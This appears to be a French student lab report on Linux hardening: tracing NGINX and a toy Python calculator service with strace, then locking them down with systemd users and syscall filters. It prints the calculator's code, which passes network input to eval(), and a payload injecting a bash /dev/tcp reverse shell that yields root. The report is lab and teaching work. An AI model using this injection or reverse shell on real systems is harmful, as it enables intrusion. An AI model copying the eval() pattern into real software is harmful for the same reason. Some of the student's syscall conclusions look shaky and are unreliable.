- vous pouvez afficher le chemin et le contenu du fichier associ√© √† un service avec `systemctl cat` :

```
sudo systemctl cat nginx
```

> Soyez attentif un peu √† son contenu, il faudra √©crire par vous-m√™mes un service √† la partie suivante. Il sera bon de s'inspirer de celui-ci !

‚ûú **La ligne la plus importante du fichier, c'est celle qui commence par `ExecStart=`**.

- c'est la commande qui est lanc√©e quand vous faites un `sudo systemctl start nginx`
- **autrement dit, lancer cette commande √† la main, c'est lancer le programme NGINX √† la main**, sans passer par le service
- pourquoi faire √ßa ? Well...

## [](#2-nginx-tracing)2. NGINX Tracing

üåû **Tracer l'ex√©cution du programme NGINX**

- lancer NGINX √† la main, et utilisez `strace` ou `sysdig` pour voir tous les appels syst√®mes qu'il effectue
  
  ```
  [rockynj@RockyNJ ~]$ strace -c nginx
  nginx: [alert] could not open error log file: open() "/var/log/nginx/error.log" failed (13: Permission denied)
  2025/02/23 14:10:38 [warn] 1669#1669: the "user" directive makes sense only if the master process runs with super-user privileges, ignored in /etc/nginx/nginx.conf:5
  2025/02/23 14:10:38 [emerg] 1669#1669: mkdir() "/var/lib/nginx/tmp/client_body" failed (13: Permission denied)
  % time     seconds  usecs/call     calls    errors syscall
  ------ ----------- ----------- --------- --------- ----------------
   53.00    0.000212          11        19         1 openat
   20.00    0.000080          26         3           newfstatat
    8.00    0.000032           1        17           read
    6.25    0.000025           1        20           futex
    3.50    0.000014           0        19           close
    3.00    0.000012           1         8           getdents64
    1.75    0.000007           0        17           fstat
    1.00    0.000004           0         7           brk
    0.75    0.000003           1         3           write
    0.75    0.000003           1         2           uname
    0.75    0.000003           3         1           sysinfo
    0.50    0.000002           2         1         1 mkdir
    0.50    0.000002           1         2           prlimit64
    0.25    0.000001           0         2           gettid
    0.00    0.000000           0         1           lseek
    0.00    0.000000           0        32           mmap
    0.00    0.000000           0        10           mprotect
    0.00    0.000000           0         1           munmap
    0.00    0.000000           0         7           pread64
    0.00    0.000000           0         1         1 access
    0.00    0.000000           0         1           getpid
    0.00    0.000000           0         1           execve
    0.00    0.000000           0         2           geteuid
    0.00    0.000000           0         1           getppid
    0.00    0.000000           0         2         1 arch_prctl
    0.00    0.000000           0         1           epoll_create
    0.00    0.000000           0         1           set_tid_address
    0.00    0.000000           0         1           set_robust_list
    0.00    0.000000           0         1           getrandom
    0.00    0.000000           0         1           rseq
  ------ ----------- ----------- --------- --------- ----------------
  100.00    0.000400           2       185         4 total
  [rockynj@RockyNJ ~]$ 
  ```
  

```
- visitez la page web d'accueil pendant que vous tracez l'ex√©cution, pour voir les *syscalls* n√©cessaires lors d'un fonctionnement normal
- ```
rockynj@RockyNJ ~]$ strace -c nginx
nginx: [alert] could not open error log file: open() "/var/log/nginx/error.log" failed (13: Permission denied)
2025/02/23 14:11:49 [warn] 1675#1675: the "user" directive makes sense only if the master process runs with super-user privileges, ignored in /etc/nginx/nginx.conf:5
2025/02/23 14:11:49 [emerg] 1675#1675: mkdir() "/var/lib/nginx/tmp/client_body" failed (13: Permission denied)
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
  0.00    0.000000           0        17           read
  0.00    0.000000           0         3           write
  0.00    0.000000           0        19           close
  0.00    0.000000           0        17           fstat
  0.00    0.000000           0         1           lseek
  0.00    0.000000           0        32           mmap
  0.00    0.000000           0        10           mprotect
  0.00    0.000000           0         1           munmap
  0.00    0.000000           0         7           brk
  0.00    0.000000           0         7           pread64
  0.00    0.000000           0         1         1 access
  0.00    0.000000           0         1           getpid
  0.00    0.000000           0         1           execve
  0.00    0.000000           0         2           uname
  0.00    0.000000           0         1         1 mkdir
  0.00    0.000000           0         1           sysinfo
  0.00    0.000000           0         2           geteuid
  0.00    0.000000           0         1           getppid
  0.00    0.000000           0         2         1 arch_prctl
  0.00    0.000000           0         2           gettid
  0.00    0.000000           0        20           futex
  0.00    0.000000           0         1           epoll_create
  0.00    0.000000           0         8           getdents64
  0.00    0.000000           0         1           set_tid_address
  0.00    0.000000           0        19         1 openat
  0.00    0.000000           0         3           newfstatat
  0.00    0.000000           0         1           set_robust_list
  0.00    0.000000           0         2           prlimit64
  0.00    0.000000           0         1           getrandom
  0.00    0.000000           0         1           rseq
------ ----------- ----------- --------- --------- ----------------
100.00    0.000000           0       185         4 total
```

- dans le compte-rendu, listez tous les *syscalls* pass√©s par NGINX

## [](#3-nginx-hardening)3. NGINX Hardening

üåû **HARDEN**

- modifier le fichier `nginx.service` pour inclure un filtrage des *syscalls*
- principe du moindre privil√®ge : vous n'autorisez que le strict n√©cessaire
- vous me remettez le fichier `nginx.service` modifi√© dans le compte-rendu naturellement !

```
[Service]
ExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'

SystemCallFilter=~ @mount @swap @clock @module @debug @obsolete
SystemCallFilter=accept4 bind brk clock_gettime close connect epoll_create epoll_ctl epoll_w>

ProtectSystem=full
ProtectHome=yes
PrivateTmp=yes
NoNewPrivileges=yes

RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX
MemoryDenyWriteExecute=yes
RestrictSUIDSGID=yes
```

# Part IV : My shitty app

**Je vous file [une application Python (toute pourrie) cod√©e avec mes mains](/it4lik/b3e-linux-2024/-/blob/main/tp/2/calc.py) :**

- elle √©coute sur un port TCP
- un client peut se connecter (genre avec `nc`)
- le client peut soumettre une op√©ration arithm√©tique
- l'application calcule le r√©sultat et l'envoie au client
- l'application se termine

> J'ai d√©v un truc vite fait, j'trouve √ßa cool d'avoir un truc simpliste de quelques lignes, facilement compr√©hensible !

[](/it4lik/b3e-linux-2024/-/raw/main/tp/2/img/shit.png)

‚ûú **Le but de cette partie va √™tre de :**

- prendre la ma√Ætrise sur l'application `calc.py`, en la lan√ßant √† la main
- l'utiliser, s'y connecter en tant que client
- cr√©er un service `calculatrice.service` qui lance l'app `calc.py` pour un h√©bergement propre
- harden le service !

‚ûú **Il vous faudra `nc` sur votre PC**

- `nc` c'est pour netcat (dispo sur tous les OS)
- un outil qui permet de se connecter de fa√ßon arbitraire √† un port TCP
- utile pour tester des trucs √† la main
- ou se connecter √† des services simplistes comme celui-ci

## [](#1-test)1. Test

D'abord, on test l'app, on prend la ma√Ætrise dessus : vous r√©cup√©rez [mon ptit code](/it4lik/b3e-linux-2024/-/blob/main/tp/2/calc.py) dans votre VM, vous le lancez √† la main, vous vous y connectez pour voir comment √ßa fonctionne.

üåû **T√©l√©chargez l'app Python dans votre VM**

- avec une commande `curl` par exemple
  
- stockez le fichier `calc.py` dans le r√©pertoire `/opt/`
  
  ```
  [rockynj@RockyNJ ~]$ sudo mv calc.py /opt/
  [sudo] password for rockynj: 
  [rockynj@RockyNJ ~]$ 
  [rockynj@RockyNJ ~]$ 
  [rockynj@RockyNJ ~]$ ls
  song.mp3
  [rockynj@RockyNJ ~]$ cd /opt/
  [rockynj@RockyNJ opt]$ ls
  calc.py
  [rockynj@RockyNJ opt]$ 
  ```
  
  ```
  [rockynj@RockyNJ opt]$ cat calc.py 
  import socket
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind(('0.0.0.0', 13337))  
  
  s.listen(1)
  conn, addr = s.accept()
  
  while True:
  
      try:
          # On re√ßoit la string Hello du client
          data = conn.recv(1024)
          if not data: break
          print(f"Donn√©es re√ßues du client : {data}")
  
          conn.send("Hello".encode())
  
          # On re√ßoit le calcul du client
          data = conn.recv(1024)
          data = data.decode().strip("\n")
  
          # Evaluation et envoi du r√©sultat
          res  = eval(data)
          conn.send(str(res).encode())
          print("R√©ponse envoy√©e au client.")
  
      except socket.error:
          print("Une erreur est survenue, d√©so.")
          break
  
  conn.close()
  ```
  

> On se pr√©occupe pas trop des permissions ou quoi pour le moment, je vous r√©serve une section d√©di√©e en dessous ;D

üåû **Lancer l'application dans votre VM**

- lancez-la avec : `python3 /opt/calc.py`
  
- ouvrez le bon port firewall
  
  ```
  [rockynj@RockyNJ opt]$ sudo firewall-cmd --permanent --zone=public --add-port=13337/tcp
  Warning: ALREADY_ENABLED: 13337:tcp
  success
  ```
  

- connectez-vous avec une commande `nc` (depuis votre PC)
  
- essayez d'envoyer genre "3+3" une fois connect√©
  
  ```
  pesso@fedora:~$ nc 10.1.1.10 13337
  
  Hello3+3
  6
  ```
  
  ```
  [rockynj@RockyNJ opt]$ sudo python3 /opt/calc.py
  Donn√©es re√ßues du client : b'3+3\n'
  Traceback (most recent call last):
    File "/opt/calc.py", line 25, in <module>
      res  = eval(data)
    File "<string>", line 0
  
  SyntaxError: unexpected EOF while parsing
  [rockynj@RockyNJ opt]$ 
  ```
  

- l'app doit vous r√©pondre "6"

## [](#2-cr%C3%A9ation-de-service)2. Cr√©ation de service

üåû **Cr√©er un service `calculatrice.service`**

- le fichier doit √™tre cr√©√© dans le r√©pertoire `/etc/systemd/system/`
  
- il doit contenir au minimum :
  
  - une section `[Unit]` :
    
    - une `Description=`
  - une section `[Service]`
    
    - un `ExecStart=` qui indique la ligne pour lancer l'application
      
      - il faut pr√©ciser les chemins absolus dans un `ExecStart=`
      - pr√©cisez-donc le chemin absolu vers la commande `python`
    - une politique de red√©marrage avec `Restart=`
      
      - comme √ßa le programme red√©marre automatiquement
      - puisqu'il quitte automatiquement apr√®s chaque calcul
      
      ```
      [Unit]
      Description=Super serveur calculatrice
      
      [Service]
      ExecStart=/usr/bin/python3 /opt/calc.py
      Restart=always
      ```
      
      ```
      [rockynj@RockyNJ system]$ sudo nano calculatrice.service
      [rockynj@RockyNJ system]$ 
      [rockynj@RockyNJ system]$ cat calculatrice.service 
      [Unit]
      Description=Super serveur calculatrice
      
      [Service]
      ExecStart=/usr/bin/python3 /opt/calc.py
      Restart=always
      ```
      

- √ßa ressemble donc √† :

```
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/chemin/vers/le/programme/python3 /opt/calc.py
Restart=always
```

üåû **Indiquer √† systemd que vous avez modifi√© les services**

- il faut ex√©cuter cette commande **√† chaque fois** que vous modifiez un service
- ```
  [rockynj@RockyNJ opt]$ sudo systemctl daemon-reload
  ```
  

- ex√©cutez la commande suivante :

```
# on indique √† systemd de relire les fichiers de d√©finition de service
sudo systemctl daemon-reload
```

üåû **V√©rifier que ce nouveau service est bien reconnu***

- ex√©cutez un simple `systemctl status calculatrice`
  
- le service doit √™tre `inactive` s√ªrement, mais il est bien reconnu !
  
- ```
  [rockynj@RockyNJ system]$ systemctl status calculatrice
  ‚óã calculatrice.service - Super serveur calculatrice
       Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
       Active: inactive (dead)
  [rockynj@RockyNJ system]$ 
  [rockynj@RockyNJ system]$ systemctl start calculatrice
  Failed to start calculatrice.service: Access denied
  See system logs and 'systemctl status calculatrice.service' for details.
  [rockynj@RockyNJ system]$ sudo systemctl start calculatrice
  [rockynj@RockyNJ system]$ systemctl status calculatrice
  ‚óè calculatrice.service - Super serveur calculatrice
       Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
       Active: active (running) since Sun 2025-02-23 14:43:46 CET; 4s ago
     Main PID: 1845 (python3)
        Tasks: 1 (limit: 11092)
       Memory: 3.3M
          CPU: 23ms
       CGroup: /system.slice/calculatrice.service
               ‚îî‚îÄ1845 /usr/bin/python3 /opt/calc.py
  
  Feb 23 14:43:46 RockyNJ systemd[1]: Started Super serveur calculatrice.
  [rockynj@RockyNJ system]$ 
  ```
  

> Y'a pas d'erreurs genre "service calculatrice not found" truc du genre.

üåû **Vous devez pouvoir utiliser l'application normalement :**

- d√©marrage de l'application avec `sudo systemctl start calculatrice`
  
- vous pouvez vous connecter depuis votre PC
  
- l'affichage de l'application est disponible dans les logs : `journalctl -xe -u calculatrice`
  
  ```
  [rockynj@RockyNJ system]$ journalctl -xe -u calculatrice
  Feb 23 14:45:51 RockyNJ systemd[1]: calculatrice.service: Main process exited, code=exited, >
  ‚ñë‚ñë Subject: Unit process exited
  ‚ñë‚ñë Defined-By: systemd
  ‚ñë‚ñë Support: https://wiki.rockylinux.org/rocky/support
  ‚ñë‚ñë 
  ‚ñë‚ñë An ExecStart= process belonging to unit calculatrice.service has exited.
  ‚ñë‚ñë 
  ‚ñë‚ñë The process' exit code is 'exited' and its exit status is 1.
  Feb 23 14:45:51 RockyNJ systemd[1]: calculatrice.service: Failed with result 'exit-code'.
  ‚ñë‚ñë Subject: Unit failed
  ‚ñë‚ñë Defined-By: systemd
  ‚ñë‚ñë Support: https://wiki.rockylinux.org/rocky/support
  ‚ñë‚ñë 
  ‚ñë‚ñë The unit calculatrice.service has entered the 'failed' state with result 'exit-code'.
  Feb 23 14:45:51 RockyNJ systemd[1]: calculatrice.service: Scheduled restart job, restart cou>
  ‚ñë‚ñë Subject: Automatic restarting of a unit has been scheduled
  ‚ñë‚ñë Defined-By: systemd
  ‚ñë‚ñë Support: https://wiki.rockylinux.org/rocky/support
  ‚ñë‚ñë 
  ‚ñë‚ñë Automatic restarting of the unit calculatrice.service has been scheduled, as the result f>
  ‚ñë‚ñë the configured Restart= setting for the unit.
  Feb 23 14:45:51 RockyNJ systemd[1]: Stopped Super serveur calculatrice.
  ‚ñë‚ñë Subject: A stop job for unit calculatrice.service has finished
  ‚ñë‚ñë Defined-By: systemd
  ‚ñë‚ñë Support: https://wiki.rockylinux.org/rocky/support
  ‚ñë‚ñë 
  ‚ñë‚ñë A stop job for unit calculatrice.service has finished.
  ‚ñë‚ñë 
  ‚ñë‚ñë The job identifier is 2469 and the job result is done.
  Feb 23 14:45:51 RockyNJ systemd[1]: Started Super serveur calculatrice.
  ‚ñë‚ñë Subject: A start job for unit calculatrice.service has finished successfully
  ‚ñë‚ñë Defined-By: systemd
  ‚ñë‚ñë Support: https://wiki.rockylinux.org/rocky/support
  ‚ñë‚ñë 
  ‚ñë‚ñë A start job for unit calculatrice.service has finished successfully.
  ‚ñë‚ñë 
  ‚ñë‚ñë The job identifier is 2469.
  ```
  

## [](#3-hack)3. Hack

‚ûú **Bon bah cette application est compl√®tement vuln√©rable hein**

Y'a aucune protection en fait, plut√¥t que de saisir un calcul en tant que client, on peut saisir beaucoup de choses !

üåû **Hack l'application**

- lancez le service `calculatrice` dans la VM
- depuis votre PC, vous vous connectez √† l'application Python avec `nc`
- exploitez l'application pour obtenir un shell `root`
- dans le compte-rendu, je veux votre payload (ce que vous tapez pour obtenir le shell `root`)

#### Apr√®s 10 ans de recherches, j'ai compris que la fonction `eval()` en Python pouvait √™tre utilis√©e √† mauvais escient pour injecter du code. J'ai d√©couvert cela lors de mes recherches.

#### Dans un premier temps, j'ai ouvert un port d'√©coute sur ma machine locale (le port 4444). Ensuite, j'ai √©tabli une connexion avec `netcat` sur le service calculatrice et j'ai ex√©cut√© cette commande, ce qui m'a permis d'obtenir un shell sur mon port d'√©coute 4444.

```
pesso@fedora:~$ nc 10.1.1.10 13337

Hello__import__('os').system('bash -i >& /dev/tcp/10.1.1.250/4444 0>&1')
```

```
pesso@fedora:/opt$ nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.1.1.10.
Ncat: Connection from 10.1.1.10:56176.
bash: cannot set terminal process group (1974): Inappropriate ioctl for device
bash: no job control in this shell
[root@RockyNJ /]# 

[root@RockyNJ /]# 

[root@RockyNJ /]# 

[root@RockyNJ /]# ls
ls
afs
bin
boot
dev
etc
home
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
[root@RockyNJ /]# 
```

> Y'a **une fonction utilis√©e dans le code qui est notoirement sensible** si on s'en sert mal... et l√† c'est genre la pire utilisation possible !

## [](#4-harden)4. Harden

### [](#a-utilisateurs)A. Utilisateurs

On va commencer par g√©rer correctement l'identit√© sous laquelle s'ex√©cute le serveur calculatrice.

Si on pr√©cise rien dans un `.service`, √ßa s'ex√©cute en `root` par d√©faut.

On va donc cr√©er un utilisateur d√©di√©, qui poss√®de le strict n√©cessaire, et on le d√©finira dans le `.service` pour qu'il lance notre application Python.

üåû **Prouvez que le service s'ex√©cute actuellement en `root`**

- avec une commande `ps` et un `grep`
  
- pendant que le service `calculatrice` s'ex√©cute
  
  ```
  [root@RockyNJ /]# ps aux | grep calculatrice
  ps aux | grep calculatrice
  root        1996  0.0  0.1   6408  2176 ?        S    15:38   0:00 grep --color=auto calculatrice
  ```
  

üåû **Cr√©er l'utilisateur `calculatrice`**

- principe du moindre privil√®ge :
  
  - un shell restrictif (`nologin`)
    
  - pas de home directory
    
  - pas de mot de passe
    
  - aucun groupe particulier
    
    ```
    [root@RockyNJ /]# sudo useradd -r -s /sbin/nologin -M -N calculatrice
    ```
    

üåû **Adaptez les permissions**

- le fichier `/opt/calc.py` doit appartenir √† notre nouvel utilisateur
  
- le fichier `/opt/calc.py` doit appartenir √† notre nouveau groupe
  
- les permissions doivent √™tre les plus restrictives possibles pour que le service fonctionne
  
  ```
  [rockynj@RockyNJ opt]$ sudo chown calculatrice /opt/calc.py
  [rockynj@RockyNJ opt]$ sudo chmod 700 /opt/calc.py
  [rockynj@RockyNJ opt]$ 
  ```
  

üåû **Modifier le `.service`**

- ajoutez la clause `User=calculatrice`
  
- n'oubliez pas de `sudo systemctl daemon-reload` pour que le changement prenne effet
  
- red√©marrez le service
  
  ```
  [rockynj@RockyNJ opt]$ sudo nano /etc/systemd/system/calculatrice.service
  [rockynj@RockyNJ opt]$ 
  [rockynj@RockyNJ opt]$ sud cat /etc/systemd/system/calculatrice.service 
  -bash: sud: command not found
  [rockynj@RockyNJ opt]$ sudo cat /etc/systemd/system/calculatrice.service 
  [Unit]
  Description=Super serveur calculatrice
  
  [Service]
  ExecStart=/usr/bin/python3 /opt/calc.py
  Restart=always
  User=calculatrice
  
  [rockynj@RockyNJ opt]$ 
  ```
  
  ```
  [rockynj@RockyNJ opt]$ sudo systemctl daemon-reload
  [rockynj@RockyNJ opt]$ sudo systemctl restart calculatrice.service
  [rockynj@RockyNJ opt]$ 
  [rockynj@RockyNJ opt]$ 
  [rockynj@RockyNJ opt]$ sudo systemctl status calculatrice.service
  ‚óè calculatrice.service - Super serveur calculatrice
       Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
       Active: active (running) since Sun 2025-02-23 15:44:04 CET; 2s ago
     Main PID: 2143 (python3)
        Tasks: 1 (limit: 11092)
       Memory: 3.3M
          CPU: 22ms
       CGroup: /system.slice/calculatrice.service
               ‚îî‚îÄ2143 /usr/bin/python3 /opt/calc.py
  
  Feb 23 15:44:04 RockyNJ systemd[1]: Started Super serveur calculatrice.
  [rockynj@RockyNJ opt]$ 
  ```
  

üåû **Prouvez que le service s'ex√©cute d√©sormais en tant que `calculatrice`**

- avec une commande `ps` et un `grep`
  
  ```
  [rockynj@RockyNJ opt]$ ps aux | grep calc
  calcula+    2258  0.0  0.4  10828  8064 ?        Ss   15:51   0:00 /usr/bin/python3 /opt/calc.py
  ```
  

### [](#b-syscalls)B. Syscalls

Bon bah ouais on revient au th√®me du TP, vous le voyez venir :D

üåû **Tracez l'ex√©cution de l'application : normal**

- effectuez un tracing avec `strace` ou `sysdig`
  
- donnez dans le compte-rendu la liste des syscalls effectu√©s par l'application `calc.py` pendant son fonctionnement normal
  
  ```
  [rockynj@RockyNJ opt]$ sudo strace -c -p $(pgrep -f '/opt/calc.py')
  strace: Process 2341 attached
  % time     seconds  usecs/call     calls    errors syscall
  ------ ----------- ----------- --------- --------- ----------------
   90.02    0.004131        4131         1           wait4
    6.36    0.000292         146         2           close
    1.11    0.000051          51         1           sendto
    1.02    0.000047          47         1           munmap
    0.63    0.000029          29         1           write
    0.28    0.000013          13         1           getsockname
    0.24    0.000011           3         3           rt_sigaction
    0.15    0.000007           7         1         1 getpeername
    0.13    0.000006           6         1           recvfrom
    0.04    0.000002           2         1           rt_sigprocmask
  ------ ----------- ----------- --------- --------- ----------------
  100.00    0.004589         353        13         1 total
  [rockynj@RockyNJ opt]$ 
  ```
  

üåû **Tracez l'ex√©cution de l'application : hack**

- idem, mais pendant que vous exploitez la vuln√©rabilit√©
  
  ```
  [rockynj@RockyNJ opt]$ sudo strace -c -p $(pgrep -f '/opt/calc.py')
  strace: Process 2319 attached
  % time     seconds  usecs/call     calls    errors syscall
  ------ ----------- ----------- --------- --------- ----------------
   95.73    0.012343       12343         1           wait4
    3.37    0.000435         217         2           close
    0.61    0.000079          79         1           write
    0.10    0.000013          13         1           munmap
    0.09    0.000011          11         1           getsockname
    0.05    0.000007           2         3           rt_sigaction
    0.05    0.000006           6         1         1 getpeername
    0.00    0.000000           0         1           rt_sigprocmask
    0.00    0.000000           0         1           sendto
    0.00    0.000000           0         1           recvfrom
  ------ ----------- ----------- --------- --------- ----------------
  100.00    0.012894         991        13         1 total
  ```
  

- vous voyez un ou plusieurs syscalls en plus ? Si oui, lesquels ?
  
  ```
  oui le write
  ```
  

üåû **Adaptez le `.service`**

- ajoutez un filtrage des *syscalls* dans le fichier `calculatrice.service`
  
- ```
  [rockynj@RockyNJ opt]$ sudo cat /etc/systemd/system/calculatrice.service
  [Unit]
  Description=Super serveur calculatrice
  
  [Service]
  ExecStart=/usr/bin/python3 /opt/calc.py
  Restart=always
  User=calculatrice
  SystemCallFilter=~write
  
  [Install]
  WantedBy=multi-user.target
  ```
  

- v√©rifiez que l'exploitation est devenue plus compliqu√©e
  

## L'exploitation est compliqu√©e comme le syscall write est dans la liste des filtres.

```
pesso@fedora:~$ nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.1.1.10.
Ncat: Connection from 10.1.1.10:39500.
pesso@fedora:~$ 
```
